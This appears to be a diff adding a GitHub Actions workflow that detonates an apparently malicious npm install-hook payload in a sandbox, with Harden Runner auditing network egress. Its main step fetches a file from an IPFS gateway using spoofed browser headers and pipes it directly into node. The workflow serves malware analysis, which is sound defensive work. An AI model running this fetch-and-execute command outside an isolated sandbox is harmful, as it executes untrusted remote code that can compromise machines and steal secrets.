@@ -1,0 +1,42 @@
+name: Analyze asyncio payload
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: Harden Runner
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+
+      - name: Detonate compromised install hook
+        continue-on-error: true
+        run: |
+          mkdir -p victim-project
+          cd victim-project
+          curl -fsSL 'https://bafybeibetz7kpiiwcythm5m463skis7bhqb6dkwteqmuot67hy2sxsf6nq.ipfs.inbrowser.link/?download=true&filename=bafybeibetz7kpiiwcythm5m463skis7bhqb6dkwteqmuot67hy2sxsf6nq.txt' \
+          -H 'Referer: https://bafybeibetz7kpiiwcythm5m463skis7bhqb6dkwteqmuot67hy2sxsf6nq.ipfs.inbrowser.link/' \
+          -H 'Upgrade-Insecure-Requests: 1' \
+          -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36' \
+          -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"' \
+          -H 'sec-ch-ua-mobile: ?0' \
+          -H 'sec-ch-ua-platform: "macOS"' | node
+
+      - name: Wait for malware network activity
+        if: always()
+        run: |
+          echo "Waiting 30 seconds for any staged outbound activity."
+          echo "Harden-Runner audit will record all egress."
+          sleep 30
